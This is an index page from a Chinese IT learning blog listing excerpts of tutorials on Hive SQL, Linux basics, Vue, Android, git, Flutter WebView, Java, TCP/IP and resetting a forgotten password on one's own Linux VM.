<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eff6d9bc39642073414c126ad1cd26ec/" rel="bookmark">
			distribute by、 clustered by 、 order by 、 sort by 的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		order by 会最终在一个reducer上面做排序，全局统一
sort by 一般会和distribute by配合使用，distribute by会把按照后面跟的字段把数据打到同一个 reducer 上面，然后根据sort by在相应的reducer上面做局部聚合
cluster by 是distribute by和sort by的结合，不过只能按照某一个字段来排序
另外使用distribute by rand() 可以解决数据倾斜或者部分reducer计算压力较大的问题
比如
select city_name ,sum(sales_amt) as city_sales_amt from ( select city_name, sales_amt from dwd.dwd_testing_sales_id where pt = '20220714' distribute by pmod(hash(1000* rand()),100) ) t group by city_name 上述的代码会先根据1000* rand()后取hash值，再将跟100取模后的结果，发送到后面100个reducer中。 这样可以避免少量reducer计算大量的值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/835daabcb2447c4156b0ee155bd85ec3/" rel="bookmark">
			Linux系统的文件和目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​ Linux系统的文件和目录：
特征：
1.在Linux系统中没有盘符概念
2.Linux系统中所有文件都存放在根目录下（常用“/”代表）
使用目录：
1./：根目录
2./home：所有普通用户的家目录
3./root：Linux系统超级管理员的家目录
4./usr/bin：Linux大部分都存在该目录下
Linux系统文件和目录文件的特点：
1.普通用户和超级管理员用户权限有很大区别：
a.普通用户可以进入超级管理员的家目录，但是无法对其中的文件进行任何操作
b.但是超级管理员用户可以做任何操作（实际工作中，一般不会轻易获取root用户权限）
2.一般情况下，普通用户的操作范围仅限在自己的家目录当中
例如:当前用户为admin，操作范围权限：/home/admin
​
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c03b9fbbfab94d69ef65b30a92aadae/" rel="bookmark">
			图片和数据懒加载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目标 了解如何实现图片数据懒加载
图片懒加载 背景 电商类网站，图片会非常的多，而如果一上来就加载所有的图片，会导致网页加载很慢
图片懒加载：等图片正式进入到可视区中时，才加载对应的图片，否则不请求图片
图片懒加载的原理:
如何知道图片进入或者离开了可视区？
通过vueuse封装的useIntersectionObserver
useIntersectionObserver // 实时监听这个dom是否在可视区内 // const { stop } = useIntersectionObserver(要监视的dom, ([{ isIntersecting }]) =&gt; { // // 回调函数: 当 isIntersecting 变化时：从可见-&gt;不可见； 不可见-&gt;可见 // isIntersecting: 当前是否可见？ // }) // stop: 停止监听 优化代码--封装自定义指令
封装指令 v-lazy，实现图片懒加载
/1.导入所有的公共组件 //2.定义插件,并导出 import { useIntersectionObserver } from '@vueuse/core'; import defaultImg from '@/assets/images/200.png' import {App} from 'vue' export default { install(app:App){ app.directive('lazy',{ //mounted是v3自定义指令的生命周期,它会被自动调用 //它表示的含义和组件的mounted是一致的 //el是dom元素, binding mounted(el,binding){ //设置默认图 el.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c03b9fbbfab94d69ef65b30a92aadae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d8e3f610f3102f9558a27c13d0886c8/" rel="bookmark">
			Android P/Q中PackageManagerService添加接口方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		低版本android系统PackageManagerService添加方法的文章：
为Android中PackageManagerService添加方法_散落一地的蓝的博客-CSDN博客
谷歌对于所有的类和API，分为开方和非开放两种，而开放的类和API，可以通过“Javadoc标签”与源码同步生成“程序的开发文档”；当我们修改或者添加一个新的API时，我们有两种方案可以避免出现上述错误.
其一是将该接口加上 非公开的标签：/*{@hide}/；
再者可以在修改后执行：make update-api(公开)，将修改内容与API的doc文件更新到一致。
对于android P和android Q，除像低版本那样修改aidl以及java等文件的代码外，还需要将添加的接口方法在下面的文件中进行声明：
android P：
aosp/prebuilts/sdk/api/28.txt
diff --git a/sdk/api/28.txt b/sdk/api/28.txt index 26e4298..e3afc34 100644 --- a/sdk/api/28.txt +++ b/sdk/api/28.txt @@ -11192,6 +11192,7 @@ package android.content.pm { method public abstract android.content.pm.PackageInfo getPackageInfo(java.lang.String, int) throws android.content.pm.PackageManager.NameNotFoundException; method public abstract android.content.pm.PackageInfo getPackageInfo(android.content.pm.VersionedPackage, int) throws android.content.pm.PackageManager.NameNotFoundException; method public abstract android.content.pm.PackageInstaller getPackageInstaller(); + method public abstract int setName(java.lang.String); method public abstract int getPackageUid(java.lang.String, int) throws android.content.pm.PackageManager.NameNotFoundException; method public abstract java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d8e3f610f3102f9558a27c13d0886c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb2683d5397c4cef1a993bda7d95bd83/" rel="bookmark">
			postman实现压力测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		**
注意根据序号来 **
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6af9c72b43b3dd969786e33317604275/" rel="bookmark">
			warn - Attempted to load @next/swc-linux-x64-
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述： node项目构建
构建命令：npm run build:test
报错如下：
......... fo - Using experimental wasm build of next-swc warn - Attempted to load @next/swc-linux-x64-gnu, but an error occurred: libssl.so.1.1: cannot open shared object file: No such file or directory warn - Attempted to load @next/swc-linux-x64-gnux32, but it was not installed warn - Attempted to load @next/swc-linux-x64-musl, but an error occurred: libc.musl-x86_64.so.1: cannot open shared object file: No such file or directory panicked at 'The global thread pool has not been initialized.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6af9c72b43b3dd969786e33317604275/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/207ffd61c92f0383e6cd4ddb5630e18d/" rel="bookmark">
			[git] git diff
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git diff 用来比较文件之间的不同，其基本用法如下。
git diff：显示工作目录(working tree)与索引区(即暂存区快照，index，就是git add过的)之间的文件变更，即显示未被add的文件变更。
git diff --cached 或 git diff --staged：显示索引区和最后一次commit(HEAD)之间的文件更改，即显示已add但还未commit的文件变更。也即用"git commit"（不带-a）将被提交的文件变更。
git diff HEAD：显示工作目录与最后一次commit之间的文件变更，即显示所有未commit（包括未add和add两类）的文件变更。也即用"git commit -a”将被提交的文件变更。
git diff &lt;分支名1&gt; &lt;分支名2&gt; ：比较两个分支上最后 commit 的内容的差别。比如，先git fetch下，然后比较远程的master与当前分支已经commit的内容差别：git diff origin/master feature/20170831_1214776_xiufu_1。此时是以origin/master分支为基础进行比较的，若把xiufu分支写在前面，则是以xiufu分支为基础进行比较的。 也可写作：git diff &lt;分支名1&gt;…&lt;分支名2&gt;
要查看有哪些文件发生了变化，可以加上–stat参数：
git diff origin/master feature/20170502_806526_dianshang_1 --stat
根据–stat的结果得到存在差异的文件列表，然后可用git diff 进一步查看该文件在两个分支中的差异：
git diff origin/master feature/20161114_263258_marketing_1 biz/src/main/java/com/sports/gerrard/biz/service/MarketingActivityService.java
1.git diff用来比较文件之间的不同，其基本用法如下：
（1）git diff：当工作区有改动，临时区为空，diff的对比是“工作区与最后一次commit提交的仓库的共同文件”；当工作区有改动，临时区不为空，diff对比的是“工作区与暂存区的共同文件”。
（2）git diff --cached 或 git diff --staged：显示暂存区(已add但未commit文件)和最后一次commit(HEAD)之间的所有不相同文件的增删改(git diff --cached和git diff –staged相同作用)
（3）git diff HEAD：显示工作目录(已track但未add文件)和暂存区(已add但未commit文件)与最后一次commit之间的的所有不相同文件的增删改。
（3.1）git diff HEAD~X或git diff HEAD^^…(后面有X个符号，X为正整数):可以查看最近一次提交的版本与往过去时间线前数X个的版本之间的所有同(3)中定义文件之间的增删改。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/207ffd61c92f0383e6cd4ddb5630e18d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/422a47dcb6d609b413291ad71c427437/" rel="bookmark">
			Mac M1上EasyConnect报客户端与服务器版本不一致
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装EasyConnect后，连接客户VPN报错客户端与服务器版本不一致，根据提示到服务器对应页面下载了Mac版安装包后还是不行。网上百度好久后，在esayconnect Mac版，出现“您的客户端与服务器不匹配” - SSL VPN/EMM - 深信服社区找到了适合M1的安装包，最后能正常使用。
https://download.sangfor.com.cn/download/product/sslvpn/pkg/mac_767/EasyConnect_7_6_7_4.dmg
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca080d082af41fe54ec6de6af5f66434/" rel="bookmark">
			C语言结构体实现简易通讯录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		❤️ C语言结构体实现简易通讯录(静态版) 前言：
在对结构体、枚举等自定义类型的学习后，便尝试使用结构体等相关知识来实现简易通讯录。由于对C语言的GUI界面未能了解，所以此次实现的通讯录只是十分简易的通讯录，该通讯录有静态版，动态版，文件版今天主要实现静态版
前排提醒：因涉及代码实现及思路，文章略长，不看思路的同学也可以直接移步到代码仓库查看源码哦！
💗: 查看详细代码请移步到仓库 -------&gt; 通讯录代码
🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻 🐻
文章目录 ❤️ C语言结构体实现简易通讯录(静态版)💙代码速览 + 成果展示☀️代码速览❄️ 部分成果展示 💛实现思路🐰 1、使用结构体创建通讯录🐮2、打印目录供用户选择并初始化所创建的通讯录🐯3、逐一实现各个功能函数 💜 学习经验总结 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 🐰 💙代码速览 + 成果展示 ☀️代码速览 //主文件中代码展示 int main() { int input = 0; Contact_people con; //利用通讯录结构体在主文件中创建一个名为con的通讯录 Init_Contact(&amp;con); //进行封装初始化 do { menu(); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca080d082af41fe54ec6de6af5f66434/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c67772558780326ff9fb4fac1faf2f5e/" rel="bookmark">
			深入解析DOM树的加载过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在浏览器中输入URL,交给DNS域名解析，找到IP，向服务器发送请求；（里面还有缓存，http协议，TCP等等）
2.服务器返回数据，浏览器接收文件（html,js,css,img...）,二进制文件。
二进制转换成html，比如index.html
构建DOM树，html解析器，过程中遇到没有defer和async的&lt;script&gt;时，会终端解析，等待&lt;script&gt;下载完成继续开始解析。
文件解析的过程中遇到含有defer和async的&lt;script&gt;时，会放到后台进行下载，并不会阻止当前文件的解析。（defer是整个页面解析完毕后才开始执行。async是异步执行，页面未必解析完毕）
3.构建css树，css解析器
4.构建render树，dom树+css树
5.布局layout与绘制point,计算对象之间的大小，确定每个节点在屏幕的确切坐标。
reflow（回流）：当元素属性发生改变且影响布局时（宽高、内外边距等），产生回流，相当于刷新页面
repaint（重绘）：当元素属性发生改变且不影响布局时（颜色、透明度等），产生重绘，相当于不刷新页面，动态更新内容。
重绘不一定引起回流，回流必将引起重绘
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7d2ba7b7f3954499c674a24b8a6ab53/" rel="bookmark">
			【跟我一起学Linux之Ubuntu】-概述与安装配置笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Debian与Ubuntu简介 1.1：Debian简介： 是从1993 年，由lan Murdockk(伊恩·默多克) 发起的，因为受到当时 Linux 与 GNU 的鼓舞，目标是成为⼀个公开的发行版，经过二十几年的迭代更新，Debian 从⼀个小型紧密的自由软件骇客（hacker）小组，逐渐成长成今日庞大且运作良好的开发者与用户社群，Debian 的名字是由 Debian 的创始人 Ian Murdock (伊恩·默多克) 和他的爱妻 Debra(黛布拉) 两⼈的名字组合而成的。
Debian 是由⼤约⼀千个分布在世界各地的开发者⽆偿地利⽤他们的业余时间开发的，⽽这些开发者实际上⼤部分都没⻅过⾯，彼此之间的通讯⼤多是通过电⼦邮件（lists.debian.org 上的邮件列表）和 IRC（irc.debian.org上的 #debian 频道）来完成的，目前Debian 提供59000多个软件包的维护与更新。
Debian官⽹：https://www.debian.org/ 官⽅镜像地址：https://www.debian.org/mirror/list 清华⼤学下载地址：https://mirrors.tuna.tsinghua.edu.cn/debian-cd/10.1.0-live/amd64/iso-hybrid/ 1.2：Ubuntu简介： Ubuntu （友帮拓、优般图、乌班图） 早期是⼀个开源的GNU/Linux操作系统，Ubuntu 是基于Debian GNU/Linux，它⽀持x86、amd64（即x64）和 ppc架构，由全球化的专业开发团队（Canonical Ltd）打造的，其名称来自非洲南部祖鲁语或豪萨语的“ubuntu”⼀词，类似儒家“仁爱”的思想，意思 是“⼈性”、“我的存在是因为大家的存在”，是非洲传统的⼀种价值观， Ubuntu基于Debian发行版和GNOME桌面环境，而从11.04版起，Ubuntu 发行版放弃了Gnome桌面环境，改为Unity，与Debian的不同在于它每6个月会发布⼀个新版本，Ubuntu的目标在于为⼀般用户提供⼀个最新的、同时又相当稳定的主要自由软件构建而成的操作系统，Ubuntu具有庞大的社区力量，用户可以方便地从社区获得帮助，Ubuntu对GNU/Linux的普及 特别是桌面普及作出了巨大贡献，由此使更多人共享开源的成果与精彩。
Canonical公司是⼀个私营公司，由南非的企业家马克·沙特尔沃思(Mark Shuttleworth)创建，主要为了促进开源软件项目，Canonical在马恩岛登记注册，其雇员分布在世界各地，其主要办事处在伦敦，在蒙特利尔也有办事处， Canonical公司⽀持并创建了⼏个项目，主要都是自由/开源软件（FOSS）或 是⼀些旨在改善自由软件开发者和贡献者的⼯具。
http://www.techweb.com.cn/business/2013-08-20/1318187.shtml （有兴趣伙伴可以看看）#ubuntu公司目前并未实现盈利。。
Ubuntu是各种公有云上最受欢迎的操作系统，这是因为Ubuntu与各大云运营商密切合作，针对云服务商的基础架构优化内核和系统，加快安全更新速度，并最大限度降低用户默认需要的网络或存储成本。
https://cn.ubuntu.com/ #中⽂官⽹ https://ubuntu.com/download #英⽂官⽹ 1.3：Ubuntu 历史发行版本： Ubuntu没有像其它软件—样有1.0版本，是因为其第一个版本是发布于2004年，所以Ubuntu的生日是2004年的10月20日。
ubuntu的版本号有个固定的特征，其使用一个形容词和一个动物名称组成，并且形容词和名词的首字母都是一致的，Ubuntu版本的命名规则是根据正式版发布的年月命名，Ubuntu 16.04也就意味着2016年4月发布的Ubuntu，研发人员与用户可从版本号码就知道正式发布的时间。
每两年的4月份，都会推出一个长期支持版本(LTS)，其支持期长达五年，而非LTS版本的支持期通常只有半年。
https://baike.baidu.com/item/ubuntu #Ubuntu历史版本⼀览表 1.4：Ubuntu 使用场景： Ubuntu系统在物联网、桌面系统、云环境、服务器系统与容器有广泛使用场景，如下：
1.4.1：Ubuntu 桌面系统： Ubuntu 作为个人电脑即快速又安全、开源、免费、有数以千计的应用程序可供选择。从工作学习、到娱乐游戏，无所不能。
1.4.1.1：Ubuntu 桌面系统简介： 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7d2ba7b7f3954499c674a24b8a6ab53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb44b16a22a90d9cf340bb18d46334d5/" rel="bookmark">
			VMware虚拟机忘记Linux用户登陆密码，重置密码解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware虚拟机安装Linux系统，忘记用户登陆密码怎么解决，可以通过重启VMware虚拟机进入系统操作界面去重置密码，重新修改密码。
下面是详细的操作步骤：
1、点击栏目上的倒三角形，选择重新启动客户机
2、等待重启虚拟机进度条出现，按下键盘E键，进入系统编辑界面
3、出现上图再按一次E键，出现下图按向下键👇，选择第二行，再一次按下E键
4、进入到下图界面，再输入空格+s（例如： s），回车
5、进入下面界面后再按下B键，进入boot系统
6、输入passwd root（root就是你需要修改密码的Linux用户名），回车
7、输入修改后的密码并确认密码，注意密码不要太过于简单，出现以下界面代表修改密码成功。
8、修改密码成功后，输入reboot命令重启Linux系统，等待重启完成，重新登陆就可以了
9、输入新密码登陆成功
感谢各位道友点赞，经济允许的道友可以赏条雪糕，天气太热码字太累！
参考：http://www.ysxbohui.com/article/9
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8e4a69d307f9bbd53e507ba43c2f0ec/" rel="bookmark">
			【Android】在 Flutter 中使用 WebView
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 考虑一种情况，您希望在您的应用程序上显示您网站上已有的一些内容。该内容可以是一些用户协议页面或一些支付页面或其他东西。因此，您可以通过编写整个页面的逻辑来构建整个页面，然后在您的应用程序中使用它。您可以做的第二件事就是在您的应用程序中显示您网站的内容，然后您就可以开始了。最好的部分是，您无需使用某些浏览器应用程序即可打开该网页。这样，您最终将节省在应用程序中为该页面编写代码的时间。
甚至许多应用程序都在使用此功能。例如，每当您在任何应用程序上执行一些支付操作时，您会注意到一件事，在支付过程中，将加载一个网页，您将在那里进行支付。这样做的好处是我们不需要为移动应用程序再次编写支付代码。由于您正在处理金钱，因此最好显示已经测试过的网页并进行交易，而不是再次编写代码。
因此，为了在您的应用程序中显示某些网页，您可以使用webview_flutter由 Flutter 团队构建的一个名为的插件。在这篇博客中，我们将学习如何使用这个插件来显示一个网页。
该webview_flutter插件提供了一个WebView小部件。在 iOS 上，WebView小部件由 a 支持，WKWebView而在 Android 上，WebView小部件由WebView. 所以，让我们学习如何使用它。
设置项目 创建一个新的 Flutter 项目。名称：flutter_webview_example
以下是项目结构。因此，您可以通过创建所需的文件夹（src）和文件（main.dart、app.dart、webview_container.dart）来设置项目。
添加依赖 要使用webview_flutter，您需要添加它的依赖项。因此，在您的pubspec.yaml文件中，添加以下依赖项：
dependencies: webview_flutter: ^0.3.20 注意：添加依赖项时，请提供适当的缩进，否则最终会出错。
现在，通过保存文件（如果您使用的是 VS Code）或按下pub get选项（在 Android Studio 中）安装依赖项来安装依赖项。此外，您可以使用 Flutter 从命令行安装软件包：
$ flutter pub get iOS 的附加设置 要WebView在 iOS 上使用，请打开Info.plist 文件并在文件的元素中添加以下内容：
&lt;dict&gt; ... &lt;key&gt;io.flutter.embedded_views_preview&lt;/key&gt; &lt;string&gt;YES&lt;/string&gt; ... 现在，我们完成了依赖部分。让我们继续编码部分。
编码部分 打开main.dart文件并添加以下代码：
import 'package:flutter/material.dart'; import 'package:flutter_webview_example/src/app.dart'; void main() =&gt; runApp(App()); 现在，创建一个名为的新文件夹src，并在此文件夹下创建两个文件app.dart，即webview_container.dart. 该app.dart文件将用于向该文件提供要加载的 URL 和 AppBar 的标题webview_container.dart。该webview_container.dart文件负责添加WebView以在应用程序中显示所需的 URL。
以下是该app.dart文件的代码：
import 'package:flutter/material.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8e4a69d307f9bbd53e507ba43c2f0ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fbc8bb6d9cbdcfde351e93939ad80fb/" rel="bookmark">
			StyleFlow简明阅读：使用持续流完成属性编辑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文：StyleFlow: Attribute-conditioned Exploration of StyleGAN-Generated Images using Conditional Continuous Normalizing Flows
ACM TOG 2021 code 论文
前言：本文论文有点繁琐晦涩，以下内容仅代表个人阅读理解
摘要 Abstract: 现在可以通过uncondition gan（例如Stylegan）生成高质量、多样化、逼真的图像，但是控制生成过程的属性选项有限、同时很难保证输出的质量，此外由于gan latent space的纠缠特性，沿着一个属性进行编辑很容易导致其他属性的篡改。本文在条件探索纠缠潜空间的背景下，研究了属性条件抽样和属性控制编辑两个子问题。
作为 GAN 潜空间中条件连续正规化流的一个实例，我们将条件探索表述为由属性特征决定的条件连续正规化流，从而将 StyleFlow 作为这两个子问题的一个简单、有效和鲁棒的解决方案。我们使用 StyleGAN 的人脸和汽车的潜在空间来评估我们的方法，并且在真实照片和 StyleGAN 生成的图像上展示沿着各种属性的细粒度分离编辑。例如，对于面孔，我们改变相机的姿势，光照变化，表情，面部毛发，性别和年龄。最后，通过广泛的定性和定量比较，我们证明了 StyleFlow 相对于其他并发工作的优越性。
作者进行了以下两个任务：
（1）属性条件采样（即采样具有目标属性的高质量真实图像）
（2）可控制的属性编辑（即只编辑目标属性，最好的保留源图像其他信息）
其中，在任务1中，生成图像采用了StyleGan生成器，为了计算图像的属性，使用了一个属性分类器
模型方法 作者这篇文章写的比较详细，介绍了很多内容，但是不容易阅读。
在第四部分，讲解了NORMALIZING FLOWS,其实这也是该方法的核心内容，关于Flow流的介绍，但是对于初次了解的人（比如我）读起来就非常的晕，接下来就用通俗易懂的方式来介绍本篇文章模型方法。
由于StyleGan的生成过程为：
首先通过随机种子生成一个符合高斯分布的随机向量z将z经过mapping network生成解耦的向量w然后将w送入systhesis network生成图片 作者介绍了两种FLOW流的方法：DNF、CNF，用于计算数据分布之间的转换，最终作者选择使用了CNF。（这里不作介绍，感兴趣可以阅读论文）
可以理解为：1.通过CNF模块，可以将w向量结合attributes向量经过reverse inference（反向推理）得到z向量 2.通过CNF模块，也可以将z向量结合attributes向量经过forward inference（正向推理）得到w向量
CNF模块的结构如下图所示：
下面来看StyleFlow的模型：
（1）Joint Reverse Encoding（JRE）：首先得到一个w向量（可以根据real images投影得到），利用generator生成图片，然后将图片送入分类器（作者使用的是微软人脸属性分类api和光照预测网络DPR）得到attributes向量，接下来将w和at向量送入CNF网络得到z向量
（2）Conditional Forward Editing（CFE）：编辑修改attributes，然后将其和z向量送入CNF网络得到w’向量。（在这里编辑向量使用的应该也是类似interfacegan训练出来的方向向量）
（3）Edit Specific Subset Selection：作者实验发现，将w’向量加载到w+的不同层可以带来良好的效果。例如，1.更改光照：放入7~11层 2.更改年龄：放入4~7层等。
StyleFlow生成效果评估 - FID得分 关于训练部分 StyleFlow主要训练的是CNF blocks，这部分推荐阅读论文以及项目issues作者的回复。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fbc8bb6d9cbdcfde351e93939ad80fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b382a45fd281db3d2e116be2d0848be/" rel="bookmark">
			修改Element的el-table没有数据时候显示样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		加一个&lt;template #empty&gt;就可以
&lt;el-form-item label="设置物流品牌" prop="logistics_data"&gt; &lt;el-table-column align="center" width="540" prop="brand_details" label="品牌介绍"/&gt; &lt;template #empty&gt; &lt;div style="width: 100%; height: 144px;display: flex; flex-direction: column; justify- content: center;align-items: center"&gt; &lt;img style="width: 60px;height:60px;"src="../../../../../assets/images/Temporarilynodata.png" alt=""&gt; &lt;div&gt;暂无数据&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;/el-table&gt; &lt;template #empty&gt;标签里面可以自定义任何的样式 根据需求更改即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f75cbd23101b2802bae47e3c9b1591e4/" rel="bookmark">
			面试-Java【之】（revers）递归实现字符串倒序排列（详解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试-Java【之】（revers）递归实现字符串倒序排列（详解） 实现源码详解《目录：Java-JDBC学习》《幕》 实现源码详解 public class Test { public static void main(String[] args) { String str = "12345"; String revers = revers(str); System.out.println(revers); } /** * 流程 * 第1次递归: revers(subStr) + firstStr 等于 2345 ； +1 * 第2次递归: revers(subStr) + firstStr 等于 345 ； +2 +1 * 第3次递归: revers(subStr) + firstStr 等于 45 ； +3 +2 +1 * 第4次递归: 执行 return nowString; return 5 ； 向上返回，执行完毕 * * @param nowString * @return */ public static String revers(String nowString) { if (nowString.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f75cbd23101b2802bae47e3c9b1591e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f641c4a366fd95354bd5139c93dd6d11/" rel="bookmark">
			TCP/IP协议学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCP/IP协议详细了解（一） 快速了解一下TCP/IP协议族
文章目录 TCP/IP协议详细了解（一）前言一、互联网地址二、域名系统三、封装四、分用五、端口号六、RFC七、标准的简单服务八、互联网九、实现十、应用编程接口总结 前言 TCP/IP协议（Transmission Control Protocol/Internet Protocol，传输控制协议/网际协议），是一组不同层次上的多个协议的组合，通常被认为是一个四层协议系统。如下图，网络协议通常分不同层次进行开发，每一层分别负责不同的通信功能。
链路层：也叫数据链路层或者网络接口层，通常包括在操作系统的驱动程序或者计算机里对应的网络接口卡。主要负责处理传输媒介的物理接口细节。
网络层：也称为互联网层，主要负责处理分组在网络中的活动。网络层协议包括IP协议（网际协议），ICMP协议（Internet互联网控制报文协议) ，ICMP协议（Internet组管理协议)
运输层：主要负责为两台主机上的应用程序提供端到端的通信。这里有两个互不相同的传输协议TCP（传输控制协议）和UDP（用户数据报协议）
应用层：主要负责处理特定的应用程序细节。通常实现会提供下面这些通用的应用程序：Telnet远程登陆、FTP文件传输协议，SMTP简单邮件传送协议、SNMP简单网络管理协议等其他应用程序。
在TCP/IP协议组中有多少协议如下，不同层次的协议也是不同的。
上面的提到的这些协议具体内容如下：
TCP和UDP：这是我学习中见过很多次的协议，这俩都是运输层协议，二者都是用IP做为网络协议。TCP使用不靠谱的IP服务，但却提供可靠的传输层服务。UDP为应用程序发送和接收数据，与TCP不同的是UDP非常不可靠，于是也就不能保证数据能安全无误的送到目的点。
IP：网际互连协议，网络层主要协议，也被TCP和UDP使用。
ICMP：IP协议的附属协议，IP层用来与其他主机或路由器交换错误报文和其他重要信息。
IGMP：Internet组管理协议，它能将一个UDP数据报多播放到多个主机。
ARP和RARP：ARP是地址解析协议RARP是逆地址解析协议，是某些网络接口使用的特殊协议，用来转换IP层和网络接口层使用的地址。
一、互联网地址 互联网上的每个接口必须有一个唯一的Internet地址，也就是IP 地址。IP地址的长度通常为32bit，Internet地址不采用平面形式的地址空间，如下图所示，五类互联网地址格式。
32位地址通常写成四个十进制的数，每个整数对应一个字节。各类IP地址的范围如下：
可以知道区分各类地址最简单的方法就是直接看它的第一个十进制整数。
多接口主机有多个IP地址，其中每个接口都对应一个IP地址。由于互联网上的每个接口必须有一个唯一的IP地址，因此也需要一个管理机构接入互联网的网络分配IP地址，这个管理机构就是互联网网络信息中心（Internet Network Information Centre）,称作InterNIC，这个只分配网络号。主机号的分配由系统管理员来负责。
三类IP地址：单播地址（目前为单个主机）、广播地址（目的端为给定网络上的所有主机）以及多播地址（目的端为同一组内的所有主机）
二、域名系统 在TCP/IP领域中，领域系统（DNS）是一个分布的数据库，由它来提供IP地址和主机名之间的映射信息。
任何应用程序都可以用一个标准的库函数来查看给定名字的主机的IP地址，类似的，系统还提供一个你函数——给定主机的IP地址，查看它所对应的主机名。也可以把IP地址作为参数。
三、封装 当应用程序TCP传送数据的时候，数据会被送入协议栈中，到每一层都会被当作一串比特流送入网络。每一层收到的数据都要增加一些首部信息（也有的要加尾部信息）。TCP传输到IP的数据单元称作TCP报文段或者简称为TCP段，IP传送给网络接口层的数据单元称作IP数据报（IP datagram）。通过以太网传输的比特流称为帧。
